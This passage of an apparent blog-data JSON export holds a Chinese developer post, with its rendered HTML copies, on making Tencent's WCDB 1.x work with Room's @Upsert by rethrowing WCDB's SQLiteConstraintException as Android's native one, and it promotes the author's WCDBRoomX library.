Java\n  - Kotlin\n  - 鼓捣折腾\n---\n\n> 先直接推荐我的开源小库：[WCDBRoomX](https://github.com/ysy950803/WCDBRoomX) ，如果它的README就已经让你知道库的核心作用，这篇文章就不需要看了。\n\nWCDB是腾讯微信团队开源的客户端数据库框架，拥有高性能和支持加密等重要特性，并且可用于Android、iOS、Windows、macOS等多个平台。 我们知道，原生的加密数据库框架SQLCipher和不加密的SQLite相比，性能差距还是很大的，加密会使得读写效率严重下降，而WCDB很好地兼顾了性能和安全问题。\n\n- [SQLCipher和SQLite对比测试](https://github.com/ysy950803/SQLCipherPerformance)\n- [WCDB和SQLite对比测试](https://cloud.tencent.com/developer/article/1904561)\n\n对使用了Google官方Jetpack Room库的开发者，WCDB 1.x版本也提供了完美支持：[Use WCDB with Room](https://github.com/Tencent/wcdb/tree/room#use-wcdb-with-room) ，然而，WCDB 2.x版本后变成了一个纯ORM框架，虽然也支持Java、Kotlin等语言（本质上就是一层封装，底层接口都一样），但是暂时没有计划支持兼容Room，从官方文档看，2.x版本更纯粹，一套代码跨全平台，所以也不关注各平台的其他框架兼容了。\n\n> 跟WCDB的开发者也聊了聊，他们团队对Room的支持兴趣不大：[issues#1052](https://github.com/Tencent/wcdb/issues/1052) 。其实浏览一下2.x版本的更新日志，看似开发团队是iOS研发主导，很多更新也和Android无关。\n\n不过问题不大，1.x版本的性能和稳定性已经非常好，连微信客户端自己都用了好多年。唯一的一个小问题是，Room最新版本支持了 [@Upsert](https://developer.android.com/reference/kotlin/androidx/room/Upsert) 注解，如果还继续使用 `com.tencent.wcdb:room:1.x` 库的话，在插入数据时没问题，但在更新数据时会崩溃，抛出异常：`SQLiteConstraintException` 。\n\n**解决方案有两种：**\n\n- 摆烂，不再使用Room的Upsert注解，把Upsert拆成Insert和Update，这样需要改动很多现有代码。\n- Read the fucking code，看看为什么崩溃。\n\n如果你选择第一种方案，后面就不用看了，但是为什么不看看第二种方案呢？/狗头\n\n其实Upsert的实现很简单，最终执行插入或更新操作的源码在 [EntityUpsertAdapter](https://android.googlesource.com/platform/frameworks/support/+/refs/heads/androidx-main/room/room-runtime/src/commonMain/kotlin/androidx/room/EntityUpsertAdapter.kt) ：\n\n```kotlin\n    /**\n     * Upserts the given entities into the database and returns the row ids.\n     *\n     * @param entities Entities to upsert\n     * @return The SQLite row ids, for entities that are not inserted the row id returned will be -1\n     */\n    fun upsertAndReturnIdsArray(entities: Array<out T>): LongArray {\n        return LongArray(entities.size) { index ->\n            try {\n                insertionAdapter.insertAndReturnId(entities[index])\n            } catch (ex: SQLiteConstraintException) {\n                checkUniquenessException(ex)\n                updateAdapter.handle(entities[index])\n                -1\n            }\n        }\n    }\n```\n\n可以看出，每次Upsert操作都会先进行插入，如果数据已经存在，会抛异常，在catch捕获异常后，再进行更新数据的操作。所以理论上Room是可以捕获异常的，为什么集成WCDB之后就捕获不到了呢？\n\n原因是WCDB对SQLite的很多类都重新进行了封装，一些基本的代码虽然没有改动，但是包名却变成了 `com.tencent.wcdb.database` ：\n\n```java\npackage com.tencent.wcdb.database;\n\n/**\n * An exception that indicates that an integrity constraint was violated.\n */\n@SuppressWarnings(\"serial\")\npublic class SQLiteConstraintException extends SQLiteException {\n    public SQLiteConstraintException() {}\n\n    public SQLiteConstraintException(String error) {\n        super(error);\n    }\n}\n```\n\n而Room只能捕获原生的 `android.database.sqlite` 包下的异常。知道原因后，这就好改了，只需要改造 `WCDBStatement` 即可：\n\n```java\nimport com.tencent.wcdb.database.SQLiteConstraintException;\n// ...\n\nclass WCDBStatement implements SupportSQLiteStatement {\n    // ...\n\n    @Override\n    public long executeInsert() {\n        try {\n            return mDelegate.executeInsert();\n        } catch (SQLiteConstraintException ex) {\n            // 兼容新版Room的Upsert注解\n            throw new android.database.sqlite.SQLiteConstraintException(ex.getMessage());\n        }\n    }\n}\n```\n\n捕获WCDB自定义的异常后，转换一次，抛出原生SQLite库的异常，这样就能被Room的EntityUpsertAdapter捕获到，顺利兼容Upsert操作。\n\n**当然，** 我已经把这些兼容处理好了，并且迁移了相关的依赖库为AndroidX，同时集成最新版本的SQLCipher，才有了：[WCDBRoomX](https://github.com/ysy950803/WCDBRoomX)\n\n可以删掉所有WCDB、SQLCipher、SQLite相关的依赖，直接引入WCDBRoomX即可：\n\n```kotlin\ndependencies { \n//    implementation(\"androidx.sqlite:sqlite-ktx:2.4.0\")\n//    implementation(\"net.zetetic:sqlcipher-android:4.5.6@aar\")\n//    implementation(\"com.tencent.wcdb:wcdb-android:1.1-19\")\n    implementation(\"com.github.ysy950803:WCDBRoomX:1.0.0\")\n\n    // 当然，Room还是要保留的，方便独立更新，WCDBRoomX为了轻便，不会包含Room\n    val roomVersion = \"2.6.1\"\n    kapt(\"androidx.room:room-compiler:$roomVersion\")\n    implementation(\"androidx.room:room-ktx:$roomVersion\")\n}\n```\n\n快速集成：\n\n```kotlin\nRoom.databaseBuilder(...)\n    .openHelperFactory(WCDBRoomX.createOpenHelperFactory(\"db_password\"))\n    .build()\n```\n","slug":"让WCDB兼容最新版Room","published":1,"updated":"2024-03-28T04:28:28.449Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluaufh1r005pthe64rrm95t6","content":"<blockquote>\n<p>先直接推荐我的开源小库：<a href=\"https://github.com/ysy950803/WCDBRoomX\">WCDBRoomX</a> ，如果它的README就已经让你知道库的核心作用，这篇文章就不需要看了。</p>\n</blockquote>\n<p>WCDB是腾讯微信团队开源的客户端数据库框架，拥有高性能和支持加密等重要特性，并且可用于Android、iOS、Windows、macOS等多个平台。 我们知道，原生的加密数据库框架SQLCipher和不加密的SQLite相比，性能差距还是很大的，加密会使得读写效率严重下降，而WCDB很好地兼顾了性能和安全问题。</p>\n<ul>\n<li><a href=\"https://github.com/ysy950803/SQLCipherPerformance\">SQLCipher和SQLite对比测试</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1904561\">WCDB和SQLite对比测试</a></li>\n</ul>\n<p>对使用了Google官方Jetpack Room库的开发者，WCDB 1.x版本也提供了完美支持：<a href=\"https://github.com/Tencent/wcdb/tree/room#use-wcdb-with-room\">Use WCDB with Room</a> ，然而，WCDB 2.x版本后变成了一个纯ORM框架，虽然也支持Java、Kotlin等语言（本质上就是一层封装，底层接口都一样），但是暂时没有计划支持兼容Room，从官方文档看，2.x版本更纯粹，一套代码跨全平台，所以也不关注各平台的其他框架兼容了。</p>\n<blockquote>\n<p>跟WCDB的开发者也聊了聊，他们团队对Room的支持兴趣不大：<a href=\"https://github.com/Tencent/wcdb/issues/1052\">issues#1052</a> 。其实浏览一下2.x版本的更新日志，看似开发团队是iOS研发主导，很多更新也和Android无关。</p>\n</blockquote>\n<p>不过问题不大，1.x版本的性能和稳定性已经非常好，连微信客户端自己都用了好多年。唯一的一个小问题是，Room最新版本支持了 <a href=\"https://developer.android.com/reference/kotlin/androidx/room/Upsert\">@Upsert</a> 注解，如果还继续使用 <code>com.tencent.wcdb:room:1.x</code> 库的话，在插入数据时没问题，但在更新数据时会崩溃，抛出异常：<code>SQLiteConstraintException</code> 。</p>\n<p><strong>解决方案有两种：</strong></p>\n<ul>\n<li>摆烂，不再使用Room的Upsert注解，把Upsert拆成Insert和Update，这样需要改动很多现有代码。</li>\n<li>Read the fucking code，看看为什么崩溃。</li>\n</ul>\n<p>如果你选择第一种方案，后面就不用看了，但是为什么不看看第二种方案呢？&#x2F;狗头</p>\n<p>其实Upsert的实现很简单，最终执行插入或更新操作的源码在 <a href=\"https://android.googlesource.com/platform/frameworks/support/+/refs/heads/androidx-main/room/room-runtime/src/commonMain/kotlin/androidx/room/EntityUpsertAdapter.kt\">EntityUpsertAdapter</a> ：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Upserts the given entities into the database and returns the row ids.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> entities Entities to upsert</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> The SQLite row ids, for entities that are not inserted the row id returned will be -1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">upsertAndReturnIdsArray</span><span class=\"params\">(entities: <span class=\"type\">Array</span>&lt;<span class=\"type\">out</span> <span class=\"type\">T</span>&gt;)</span></span>: LongArray &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LongArray(entities.size) &#123; index -&gt;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            insertionAdapter.insertAndReturnId(entities[index])</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ex: SQLiteConstraintException) &#123;</span><br><span class=\"line\">            checkUniquenessException(ex)</span><br><span class=\"line\">            updateAdapter.handle(entities[index])</span><br><span class=\"line\">            -<span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出，每次Upsert操作都会先进行插入，如果数据已经存在，会抛异常，在catch捕获异常后，再进行更新数据的操作。所以理论上Room是可以捕获异常的，为什么集成WCDB之后就捕获不到了呢？</p>\n<p>原因是WCDB对SQLite的很多类都重新进行了封装，一些基本的代码虽然没有改动，但是包名却变成了 <code>com.tencent.wcdb.database</code> ：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.tencent.wcdb.database;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * An exception that indicates that an integrity constraint was violated.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SQLiteConstraintException</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SQLiteException</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SQLiteConstraintException</span><span class=\"params\">()</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SQLiteConstraintException</span><span class=\"params\">(String error)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而Room只能捕获原生的 <code>android.database.sqlite</code> 包下的异常。知道原因后，这就好改了，只需要改造 <code>WCDBStatement</code> 即可：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.tencent.wcdb.database.SQLiteConstraintException;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">WCDBStatement</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">SupportSQLiteStatement</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">long</span> <span class=\"title function_\">executeInsert</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mDelegate.executeInsert();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (SQLiteConstraintException ex) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 兼容新版Room的Upsert注解</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">android</span>.database.sqlite.SQLiteConstraintException(ex.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>捕获WCDB自定义的异常后，转换一次，抛出原生SQLite库的异常，这样就能被Room的EntityUpsertAdapter捕获到，顺利兼容Upsert操作。</p>\n<p><strong>当然，</strong> 我已经把这些兼容处理好了，并且迁移了相关的依赖库为AndroidX，同时集成最新版本的SQLCipher，才有了：<a href=\"https://github.com/ysy950803/WCDBRoomX\">WCDBRoomX</a></p>\n<p>可以删掉所有WCDB、SQLCipher、SQLite相关的依赖，直接引入WCDBRoomX即可：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dependencies &#123; </span><br><span class=\"line\"><span class=\"comment\">//    implementation(&quot;androidx.sqlite:sqlite-ktx:2.4.0&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">//    implementation(&quot;net.zetetic:sqlcipher-android:4.5.6@aar&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">//    implementation(&quot;com.tencent.wcdb:wcdb-android:1.1-19&quot;)</span></span><br><span class=\"line\">    implementation(<span class=\"string\">&quot;com.github.ysy950803:WCDBRoomX:1.0.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 当然，Room还是要保留的，方便独立更新，WCDBRoomX为了轻便，不会包含Room</span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> roomVersion = <span class=\"string\">&quot;2.6.1&quot;</span></span><br><span class=\"line\">    kapt(<span class=\"string\">&quot;androidx.room:room-compiler:<span class=\"variable\">$roomVersion</span>&quot;</span>)</span><br><span class=\"line\">    implementation(<span class=\"string\">&quot;androidx.room:room-ktx:<span class=\"variable\">$roomVersion</span>&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>快速集成：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Room.databaseBuilder(...)</span><br><span class=\"line\">    .openHelperFactory(WCDBRoomX.createOpenHelperFactory(<span class=\"string\">&quot;db_password&quot;</span>))</span><br><span class=\"line\">    .build()</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>先直接推荐我的开源小库：<a href=\"https://github.com/ysy950803/WCDBRoomX\">WCDBRoomX</a> ，如果它的README就已经让你知道库的核心作用，这篇文章就不需要看了。</p>\n</blockquote>\n<p>WCDB是腾讯微信团队开源的客户端数据库框架，拥有高性能和支持加密等重要特性，并且可用于Android、iOS、Windows、macOS等多个平台。 我们知道，原生的加密数据库框架SQLCipher和不加密的SQLite相比，性能差距还是很大的，加密会使得读写效率严重下降，而WCDB很好地兼顾了性能和安全问题。</p>\n<ul>\n<li><a href=\"https://github.com/ysy950803/SQLCipherPerformance\">SQLCipher和SQLite对比测试</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1904561\">WCDB和SQLite对比测试</a></li>\n</ul>\n<p>对使用了Google官方Jetpack Room库的开发者，WCDB 1.x版本也提供了完美支持：<a href=\"https://github.com/Tencent/wcdb/tree/room#use-wcdb-with-room\">Use WCDB with Room</a> ，然而，WCDB 2.x版本后变成了一个纯ORM框架，虽然也支持Java、Kotlin等语言（本质上就是一层封装，底层接口都一样），但是暂时没有计划支持兼容Room，从官方文档看，2.x版本更纯粹，一套代码跨全平台，所以也不关注各平台的其他框架兼容了。</p>\n<blockquote>\n<p>跟WCDB的开发者也聊了聊，他们团队对Room的支持兴趣不大：<a href=\"https://github.com/Tencent/wcdb/issues/1052\">issues#1052</a> 。其实浏览一下2.x版本的更新日志，看似开发团队是iOS研发主导，很多更新也和Android无关。</p>\n</blockquote>\n<p>不过问题不大，1.x版本的性能和稳定性已经非常好，连微信客户端自己都用了好多年。唯一的一个小问题是，Room最新版本支持了 <a href=\"https://developer.android.com/reference/kotlin/androidx/room/Upsert\">@Upsert</a> 注解，如果还继续使用 <code>com.tencent.wcdb:room:1.x</code> 库的话，在插入数据时没问题，但在更新数据时会崩溃，抛出异常：<code>SQLiteConstraintException</code> 。</p>\n<p><strong>解决方案有两种：</strong></p>\n<ul>\n<li>摆烂，不再使用Room的Upsert注解，把Upsert拆成Insert和Update，这样需要改动很多现有代码。</li>\n<li>Read the fucking code，看看为什么崩溃。</li>\n</ul>\n<p>如果你选择第一种方案，后面就不用看了，但是为什么不看看第二种方案呢？&#x2F;狗头</p>\n<p>其实Upsert的实现很简单，最终执行插入或更新操作的源码在 <a href=\"https://android.googlesource.com/platform/frameworks/support/+/refs/heads/androidx-main/room/room-runtime/src/commonMain/kotlin/androidx/room/EntityUpsertAdapter.kt\">EntityUpsertAdapter</a> ：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Upserts the given entities into the database and returns the row ids.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> entities Entities to upsert</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> The SQLite row ids, for entities that are not inserted the row id returned will be -1</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">fun</span> <span class=\"title\">upsertAndReturnIdsArray</span><span class=\"params\">(entities: <span class=\"type\">Array</span>&lt;<span class=\"type\">out</span> <span class=\"type\">T</span>&gt;)</span></span>: LongArray &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> LongArray(entities.size) &#123; index -&gt;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            insertionAdapter.insertAndReturnId(entities[index])</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ex: SQLiteConstraintException) &#123;</span><br><span class=\"line\">            checkUniquenessException(ex)</span><br><span class=\"line\">            updateAdapter.handle(entities[index])</span><br><span class=\"line\">            -<span class=\"number\">1</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出，每次Upsert操作都会先进行插入，如果数据已经存在，会抛异常，在catch捕获异常后，再进行更新数据的操作。所以理论上Room是可以捕获异常的，为什么集成WCDB之后就捕获不到了呢？</p>\n<p>原因是WCDB对SQLite的很多类都重新进行了封装，一些基本的代码虽然没有改动，但是包名却变成了 <code>com.tencent.wcdb.database</code> ：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.tencent.wcdb.database;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * An exception that indicates that an integrity constraint was violated.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&quot;serial&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SQLiteConstraintException</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SQLiteException</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SQLiteConstraintException</span><span class=\"params\">()</span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">SQLiteConstraintException</span><span class=\"params\">(String error)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>而Room只能捕获原生的 <code>android.database.sqlite</code> 包下的异常。知道原因后，这就好改了，只需要改造 <code>WCDBStatement</code> 即可：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.tencent.wcdb.database.SQLiteConstraintException;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">WCDBStatement</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">SupportSQLiteStatement</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">long</span> <span class=\"title function_\">executeInsert</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> mDelegate.executeInsert();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (SQLiteConstraintException ex) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 兼容新版Room的Upsert注解</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">android</span>.database.sqlite.SQLiteConstraintException(ex.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>捕获WCDB自定义的异常后，转换一次，抛出原生SQLite库的异常，这样就能被Room的EntityUpsertAdapter捕获到，顺利兼容Upsert操作。</p>\n<p><strong>当然，</strong> 我已经把这些兼容处理好了，并且迁移了相关的依赖库为AndroidX，同时集成最新版本的SQLCipher，才有了：<a href=\"https://github.com/ysy950803/WCDBRoomX\">WCDBRoomX</a></p>\n<p>可以删掉所有WCDB、SQLCipher、SQLite相关的依赖，直接引入WCDBRoomX即可：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dependencies &#123; </span><br><span class=\"line\"><span class=\"comment\">//    implementation(&quot;androidx.sqlite:sqlite-ktx:2.4.0&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">//    implementation(&quot;net.zetetic:sqlcipher-android:4.5.6@aar&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">//    implementation(&quot;com.tencent.wcdb:wcdb-android:1.1-19&quot;)</span></span><br><span class=\"line\">    implementation(<span class=\"string\">&quot;com.github.ysy950803:WCDBRoomX:1.0.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 当然，Room还是要保留的，方便独立更新，WCDBRoomX为了轻便，不会包含Room</span></span><br><span class=\"line\">    <span class=\"keyword\">val</span> roomVersion = <span class=\"string\">&quot;2.6.1&quot;</span></span><br><span class=\"line\">    kapt(<span class=\"string\">&quot;androidx.room:room-compiler:<span class=\"variable\">$roomVersion</span>&quot;</span>)</span><br><span class=\"line\">    implementation(<span class=\"string\">&quot;androidx.room:room-ktx:<span class=\"variable\">$roomVersion</span>&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>快速集成：</p>\n<figure class=\"highlight kotlin\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Room.databaseBuilder(...)</span><br><span class=\"line\">    .openHelperFactory(WCDBRoomX.createOpenHelperFactory(<span class=\"string\">&quot;db_password&quot;</span>))</span><br><span class=\"line\">    .build()</span><br></pre></td></tr></table></figure>\n"}],"PostAsset":[{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-13-46-41-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-13-46-41-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-13-53-24-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-13-53-24-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-13-55-51-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-13-55-51-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-15-07-48-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-15-07-48-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-15-11-44-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-15-11-44-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-15-12-56-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-15-12-56-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-23-16-51-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-23-16-51-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-23-42-00-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-23-42-00-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-23-45-09-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-23-45-09-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 Google IO大会之旅/2021-05-24-23-50-32-image.png","post":"cluaufh1a003uthe66vn45ryp","slug":"2021-05-24-23-50-32-image.png","modified":1,"renderable":1},{"_id":"source/_posts/2021-06-16-我的2021 